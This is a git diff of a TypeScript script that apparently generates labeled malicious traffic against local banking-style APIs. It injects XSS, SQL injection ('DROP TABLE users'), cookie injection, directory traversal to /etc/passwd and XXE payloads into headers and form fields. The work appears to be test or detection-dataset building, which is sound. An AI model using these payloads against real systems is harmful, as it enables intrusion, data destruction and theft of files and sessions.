@@ -93,21 +93,15 @@ export type SignedConsent = {
 	signed_consent_len: number;
 };
 
+// Initialize Prisma and constants
 const prisma = new PrismaClient();
 const otherBankAPI = 'http://localhost:4000';
 const otherOrgCode = 'anya123456';
 const orgCode = 'bond123456';
 const clientId = 'bond123456clientid';
 const clientSecret = 'bond123456clientsecret';
-
-// OTHER_BANK_API = 'http://localhost:4000';
-// OTHER_ORG_CODE = 'anya123456';
-
-// NEXT_PUBLIC_ORG_NAME = 'Bond Bank';
-// NEXT_PUBLIC_SERIAL_CODE = 'bond123456';
-// NEXT_PUBLIC_ORG_CODE = 'bond123456';
-// NEXT_PUBLIC_CLIENT_ID = 'bond123456clientid';
-// NEXT_PUBLIC_CLIENT_SECRET = 'bond123456clientsecret';
+const caCode = 'certauth00';
+const orgSerialCode = 'bondserial00';
 
 // Validation functions
 const validateBodyIA102 = (body: BodyIA102): void => {
@@ -139,35 +133,57 @@ interface AttackConfiguration {
 }
 
 // Generate malicious content with error handling
-const generateMaliciousContent = (): AttackConfiguration | null => {
+const generateMaliciousContent = (attackLocation: string[]): AttackConfiguration | null => {
+	//all attack location: x-api-tran-id, X-CSRF-Token, Cookie, Set-Cookie, User-Agent, search_timestamp, client_id, client_secret, grant_type, scope, username, password, org_code, account_num, next, return_app_scheme_url, device_code, device_browser, consent_type, consent_cnt, consent_list, signed_person_info_req_len, signed_person_info_req, consent_nonce, ucpid_nonce, cert_tx_id, service_id
 	try {
 		const attackConfigurations = [
-			// XSS attacks
-			...['User-Agent', 'X-CSRF-Token', 'Cookie', 'Set-Cookie'].map((location) => ({
-				type: 'XSS',
-				payload: faker.helpers.arrayElement([
-					'<script>alert("XSS")</script>',
-					'<img src="x" onerror="alert(\'XSS\')">',
-					'"><script>alert(document.cookie)</script>',
-				]),
-				location,
-			})),
+			...attackLocation
+				.filter((location) => location !== 'Cookie') // explain why Cookie is excluded: Cookie injection is a separate attack
+				.map((location) => ({
+					type: 'XSS',
+					payload: faker.helpers.arrayElement([
+						'<script>alert("XSS")</script>',
+						'<img src="x" onerror="alert(\'XSS\')">',
+						'<script>alert(document.cookie)</script>',
+					]),
+					location,
+				})),
 
 			// SQLi attacks
-			...['client_secret', 'grant_type', 'password', 'timestamp'].map((location) => ({
-				type: 'SQLi',
-				payload: faker.helpers.arrayElement([
-					"' OR '1'='1",
-					"'; DROP TABLE users--",
-					"' UNION SELECT * FROM accounts--",
-				]),
-				location,
-			})),
+			...attackLocation
+				.filter((location) => location === 'search_timestamp')
+				.map((location) => ({
+					type: 'SQLi',
+					payload: faker.helpers.arrayElement([
+						"' OR '1'='1",
+						"'; DROP TABLE users--",
+						"' UNION SELECT * FROM accounts--",
+					]),
+					location,
+				})),
 
 			// Cookie manipulation
 			...['Cookie', 'Set-Cookie'].map((location) => ({
 				type: 'CookieInjection',
 				payload: faker.helpers.arrayElement(['session=admin123; Path=/', 'isAdmin=true; HttpOnly']),
+				location,
+			})),
+
+			// Directory traversal
+			...attackLocation.map((location) => ({
+				type: 'DirectoryTraversal',
+				payload: faker.helpers.arrayElement(['../../../etc/passwd', '../../../../etc/hosts']),
+				location,
+			})),
+
+			// XML external entity injection
+			...attackLocation.map((location) => ({
+				type: 'XXE',
+				payload: faker.helpers.arrayElement([
+					'<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
+					'<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/xxe" >]><foo>&xxe;</foo>',
+					'<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
+				]),
 				location,
 			})),
 		];
@@ -186,7 +202,7 @@ const processPayload = (value: any, attack: AttackConfiguration | null, location
 		if (attack && attack.location === location) {
 			return attack.payload;
 		}
-		return faker.datatype.boolean(0.98) ? value : '';
+		return faker.datatype.boolean(0.98) ? value : faker.string.alphanumeric({ length: { min: 0, max: 20 } });
 	} catch (error) {
 		logger.error('Error processing payload', error);
 		return value;
@@ -194,19 +210,19 @@ const processPayload = (value: any, attack: AttackConfiguration | null, location
 };
 
 // Generate transaction ID with error handling
-export const generateTIN = (prefix: string): string => {
+export const generateTIN = (subject: string): string => {
+	//subject classification code
 	try {
 		const date = new Date();
-		return (
-			prefix +
-			date
-				.toISOString()
-				.replace(/[-:.TZ]/g, '')
-				.slice(0, 14)
-		);
+		// grant code 10 uppercase letters + numbers
+		const grantCode = faker.string.alphanumeric(14).toUpperCase();
+
+		const xApiTranId = `${orgCode}${subject}${grantCode}`;
+
+		return xApiTranId;
 	} catch (error) {
 		logger.error('Error generating TIN', error);
-		return `${prefix}${Date.now()}`;
+		return '00000000000000';
 	}
 };
 
@@ -246,9 +262,9 @@ export const generateBodyIA102 = async (account: any): Promise<BodyIA102> => {
 	try {
 		if (!account) throw new ValidationError('Account is required');
 
-		const caCode = faker.helpers.arrayElement(['CA20250001']);
+		const caCode = faker.helpers.arrayElement(['certauth00']);
 		const newTimestamp = timestamp(new Date());
-		const serialNum = faker.helpers.arrayElement(['BASA20240204', 'BABB20230106']);
+		const serialNum = faker.helpers.arrayElement(['anyaserial00', 'bondserial00']);
 
 		const signTxId = `${orgCode}_${caCode}_${newTimestamp}_${serialNum}`;
 		const firstName = account.firstName;
@@ -374,13 +390,13 @@ export const generateBodyIA002 = async (
 			tx_id: processPayload(txId, null, 'tx_id'),
 			org_code: processPayload(orgCode, null, 'org_code'),
 			grant_type: processPayload('password', null, 'grant_type'),
-			client_id: oAuthClient.clientId,
-			client_secret: oAuthClient.clientSecret,
+			client_id: processPayload(oAuthClient.clientId, null, 'client_id'),
+			client_secret: processPayload(oAuthClient.clientSecret, null, 'client_secret'),
 			ca_code: caCode,
 			username: processPayload(b64UserCI, null, 'username'),
 			request_type: '1',
 			password_len: b64Password.length.toString(),
-			password: b64Password,
+			password: processPayload(b64Password, null, 'password'),
 			auth_type: '1',
 			consent_type: '1',
 			consent_len: consent_list[0].consent_len.toString(),
@@ -403,14 +419,25 @@ export const generateBodyIA002 = async (
 
 // API call functions with error handling
 export const getIA101 = async () => {
+	const attackLocations = [
+		'x-api-tran-id',
+		'X-CSRF-Token',
+		'Cookie',
+		'Set-Cookie',
+		'User-Agent',
+		'client_id',
+		'client_secret',
+		'grant_type',
+		'scope',
+	];
 	try {
-		const attack = generateMaliciousContent();
+		const attack = generateMaliciousContent(attackLocations);
 
 		const options = {
 			method: 'POST',
 			headers: {
 				'Content-Type': 'application/x-www-form-urlencoded',
-				'x-api-tran-id': processPayload(generateTIN('IA101'), attack, 'x-api-tran-id'),
+				'x-api-tran-id': processPayload(generateTIN('S'), attack, 'x-api-tran-id'),
 				'X-CSRF-Token': processPayload('', attack, 'X-CSRF-Token'),
 				Cookie: processPayload('', attack, 'Cookie'),
 				'Set-Cookie': processPayload('', attack, 'Set-Cookie'),
@@ -418,7 +445,7 @@ export const getIA101 = async () => {
 				'attack-type': attack?.type || '',
 			},
 			body: new URLSearchParams({
-				grant_type: processPayload('client_credential', attack, 'grant_type'),
+				grant_type: processPayload('client_credentials', attack, 'grant_type'),
 				client_id: processPayload(clientId, attack, 'client_id'),
 				client_secret: processPayload(clientSecret, attack, 'client_secret'),
 				scope: processPayload('ca', attack, 'scope'),
@@ -434,17 +461,18 @@ export const getIA101 = async () => {
 };
 
 const getIA102 = async (access_token: string, body: BodyIA102) => {
+	const attackLocations = ['x-api-tran-id', 'X-CSRF-Token', 'Cookie', 'Set-Cookie', 'User-Agent'];
 	try {
 		if (!access_token) throw new ValidationError('Access token is required');
 		validateBodyIA102(body);
 
-		const attack = generateMaliciousContent();
+		const attack = generateMaliciousContent(attackLocations);
 		const options = {
 			method: 'POST',
 			headers: {
 				'Content-Type': 'application/json',
 				Authorization: `Bearer ${access_token}`,
-				'x-api-tran-id': processPayload(generateTIN('IA102'), attack, 'x-api-tran-id'),
+				'x-api-tran-id': processPayload(generateTIN('S'), attack, 'x-api-tran-id'),
 				'X-CSRF-Token': processPayload('', attack, 'X-CSRF-Token'),
 				Cookie: processPayload('', attack, 'Cookie'),
 				'Set-Cookie': processPayload('', attack, 'Set-Cookie'),
@@ -463,17 +491,18 @@ const getIA102 = async (access_token: string, body: BodyIA102) => {
 };
 
 const getIA103 = async (access_token: string, body: BodyIA103) => {
+	const attackLocations = ['x-api-tran-id', 'X-CSRF-Token', 'Cookie', 'Set-Cookie', 'User-Agent'];
 	try {
 		if (!access_token) throw new ValidationError('Access token is required');
 		validateBodyIA103(body);
 
-		const attack = generateMaliciousContent();
+		const attack = generateMaliciousContent(attackLocations);
 		const options = {
 			method: 'POST',
 			headers: {
 				'Content-Type': 'application/json',
 				Authorization: `Bearer ${access_token}`,
-				'x-api-tran-id': processPayload(generateTIN('IA103'), attack, 'x-api-tran-id'),
+				'x-api-tran-id': processPayload(generateTIN('S'), attack, 'x-api-tran-id'),
 				'X-CSRF-Token': processPayload('', attack, 'X-CSRF-Token'),
 				Cookie: processPayload('', attack, 'Cookie'),
 				'Set-Cookie': processPayload('', attack, 'Set-Cookie'),
@@ -492,15 +521,16 @@ const getIA103 = async (access_token: string, body: BodyIA103) => {
 };
 
 const getIA002 = async (body: BodyIA002) => {
+	const attackLocations = ['x-api-tran-id', 'X-CSRF-Token', 'Cookie', 'Set-Cookie', 'User-Agent'];
 	try {
 		validateBodyIA002(body);
 
-		const attack = generateMaliciousContent();
+		const attack = generateMaliciousContent(attackLocations);
 		const options = {
 			method: 'POST',
 			headers: {
 				'Content-Type': 'application/x-www-form-urlencoded',
-				'x-api-tran-id': processPayload(generateTIN('IA002'), attack, 'x-api-tran-id'),
+				'x-api-tran-id': processPayload(generateTIN('S'), attack, 'x-api-tran-id'),
 				'X-CSRF-Token': processPayload('', attack, 'X-CSRF-Token'),
 				Cookie: processPayload('', attack, 'Cookie'),
 				'Set-Cookie': processPayload('', attack, 'Set-Cookie'),
@@ -519,17 +549,18 @@ const getIA002 = async (body: BodyIA002) => {
 };
 
 const getAccountsBasic = async (orgCode: string, accountNum: string, access_token: string) => {
+	const attackLocations = ['x-api-tran-id', 'X-CSRF-Token', 'Cookie', 'Set-Cookie', 'User-Agent'];
 	try {
 		if (!orgCode) throw new ValidationError('Organization code is required');
 		if (!accountNum) throw new ValidationError('Account number is required');
 		if (!access_token) throw new ValidationError('Access token is required');
 
-		const attack = generateMaliciousContent();
+		const attack = generateMaliciousContent(attackLocations);
 		const options = {
 			method: 'POST',
 			headers: {
 				Authorization: `Bearer ${access_token}`,
-				'x-api-tran-id': processPayload(generateTIN('ADB01'), attack, 'x-api-tran-id'),
+				'x-api-tran-id': processPayload(generateTIN('S'), attack, 'x-api-tran-id'),
 				'X-CSRF-Token': processPayload('', attack, 'X-CSRF-Token'),
 				Cookie: processPayload('', attack, 'Cookie'),
 				'Set-Cookie': processPayload('', attack, 'Set-Cookie'),
@@ -557,17 +588,18 @@ const getAccountsBasic = async (orgCode: string, accountNum: string, access_toke
 };
 
 const getAccountsDetail = async (orgCode: string, accountNum: string, access_token: string) => {
+	const attackLocations = ['x-api-tran-id', 'X-CSRF-Token', 'Cookie', 'Set-Cookie', 'User-Agent', 'search_timestamp'];
 	try {
 		if (!orgCode) throw new ValidationError('Organization code is required');
 		if (!accountNum) throw new ValidationError('Account number is required');
 		if (!access_token) throw new ValidationError('Access token is required');
 
-		const attack = generateMaliciousContent();
+		const attack = generateMaliciousContent(attackLocations);
 		const options = {
 			method: 'POST',
 			headers: {
 				Authorization: `Bearer ${access_token}`,
-				'x-api-tran-id': processPayload(generateTIN('ADD01'), attack, 'x-api-tran-id'),
+				'x-api-tran-id': processPayload(generateTIN('S'), attack, 'x-api-tran-id'),
 				'X-CSRF-Token': processPayload('', attack, 'X-CSRF-Token'),
 				Cookie: processPayload('', attack, 'Cookie'),
 				'Set-Cookie': processPayload('', attack, 'Set-Cookie'),
@@ -578,7 +610,7 @@ const getAccountsDetail = async (orgCode: string, accountNum: string, access_tok
 				org_code: otherOrgCode,
 				account_num: accountNum,
 				next: '0',
-				search_timestamp: timestamp(new Date()),
+				search_timestamp: processPayload(timestamp(new Date()), attack, 'search_timestamp'),
 			}),
 		};
 
@@ -595,13 +627,24 @@ const getAccountsDetail = async (orgCode: string, accountNum: string, access_tok
 };
 
 export async function getSupport001() {
+	const attackLocations = [
+		'x-api-tran-id',
+		'X-CSRF-Token',
+		'Cookie',
+		'Set-Cookie',
+		'User-Agent',
+		'client_id',
+		'client_secret',
+		'grant_type',
+		'scope',
+	];
 	try {
-		const attack = generateMaliciousContent();
+		const attack = generateMaliciousContent(attackLocations);
 		const options = {
 			method: 'POST',
 			headers: {
 				'Content-Type': 'application/x-www-form-urlencoded',
-				'x-api-tran-id': processPayload(generateTIN('SU001'), attack, 'x-api-tran-id'),
+				'x-api-tran-id': processPayload(generateTIN('S'), attack, 'x-api-tran-id'),
 				'X-CSRF-Token': processPayload('', attack, 'X-CSRF-Token'),
 				Cookie: processPayload('', attack, 'Cookie'),
 				'Set-Cookie': processPayload('', attack, 'Set-Cookie'),
@@ -609,7 +652,7 @@ export async function getSupport001() {
 				'attack-type': attack?.type || '',
 			},
 			body: new URLSearchParams({
-				grant_type: processPayload('client_credential', attack, 'grant_type'),
+				grant_type: processPayload('client_credentials', attack, 'grant_type'),
 				client_id: processPayload(clientId, attack, 'client_id'),
 				client_secret: processPayload(clientSecret, attack, 'client_secret'),
 				scope: processPayload('manage', attack, 'scope'),
@@ -625,8 +668,9 @@ export async function getSupport001() {
 }
 
 export async function getSupport002() {
+	const attackLocations = ['x-api-tran-id', 'Cookie', 'Set-Cookie', 'User-Agent', 'Authorization', 'search_timestamp'];
 	try {
-		const attack = generateMaliciousContent();
+		const attack = generateMaliciousContent(attackLocations);
 		const tokenResponse = (await getSupport001()) as { access_token: string };
 
 		if (!tokenResponse?.access_token) {
@@ -637,7 +681,7 @@ export async function getSupport002() {
 			method: 'GET',
 			headers: {
 				'Content-Type': 'application/json',
-				'x-api-tran-id': processPayload(generateTIN('SU002'), attack, 'x-api-tran-id'),
+				'x-api-tran-id': processPayload(generateTIN('S'), attack, 'x-api-tran-id'),
 				Cookie: processPayload('', attack, 'Cookie'),
 				'Set-Cookie': processPayload('', attack, 'Set-Cookie'),
 				'User-Agent': processPayload('Mozilla/5.0', attack, 'User-Agent'),
@@ -646,12 +690,11 @@ export async function getSupport002() {
 			},
 		};
 
-		logger.info('Fetching organization list');
 		return await makeAPICall(
 			`http://localhost:3000/api/v2/mgmts/orgs?search_timestamp=${processPayload(
 				timestamp(new Date()),
 				attack,
-				'timestamp'
+				'search_timestamp'
 			)}`,
 			options,
 			'Organization list request'
@@ -673,7 +716,7 @@ async function main() {
 		}
 
 		// Add delay to simulate user interaction
-		await new Promise((resolve) => setTimeout(resolve, 1000));
+		await new Promise((resolve) => setTimeout(resolve, 3000));
 
 		// Fetch accounts with error handling
 		const accounts = await prisma.account
@@ -699,7 +742,7 @@ async function main() {
 			throw new APIError('Invalid sign request response', 500, 'INVALID_RESPONSE');
 		}
 
-		await new Promise((resolve) => setTimeout(resolve, 500));
+		await new Promise((resolve) => setTimeout(resolve, 4000));
 
 		const bodyIA103: BodyIA103 = {
 			sign_tx_id: bodyIA102.sign_tx_id,
@@ -711,7 +754,7 @@ async function main() {
 			throw new APIError('Invalid sign result response', 500, 'INVALID_RESPONSE');
 		}
 
-		await new Promise((resolve) => setTimeout(resolve, 500));
+		await new Promise((resolve) => setTimeout(resolve, 3000));
 
 		const bodyIA002 = await generateBodyIA002(
 			responseIA102.cert_tx_id,
@@ -724,7 +767,7 @@ async function main() {
 			throw new APIError('Failed to obtain access token', 401, 'UNAUTHORIZED');
 		}
 
-		await new Promise((resolve) => setTimeout(resolve, 500));
+		await new Promise((resolve) => setTimeout(resolve, 5000));
 
 		// Fetch account details with randomization
 		const isGetBasic = faker.datatype.boolean();
@@ -732,12 +775,12 @@ async function main() {
 
 		if (isGetBasic) {
 			await getAccountsBasic(orgCode, account.accountNum, responseIA002.access_token);
-			await new Promise((resolve) => setTimeout(resolve, 500));
+			await new Promise((resolve) => setTimeout(resolve, 4000));
 		}
 
 		if (isGetDetail) {
 			await getAccountsDetail(orgCode, account.accountNum, responseIA002.access_token);
-			await new Promise((resolve) => setTimeout(resolve, 500));
+			await new Promise((resolve) => setTimeout(resolve, 4000));
 		}
 
 		logger.info('Main process completed successfully');
@@ -760,8 +803,8 @@ async function main() {
 // Run iterations with retry logic
 async function runIterations() {
 	const iterations = 200;
-	const delayBetweenIterations = 1000;
-	const maxRetries = 3;
+	const delayBetweenIterations = 4000;
+	const maxRetries = 1;
 
 	for (let i = 0; i < iterations; i++) {
 		let retries = 0;
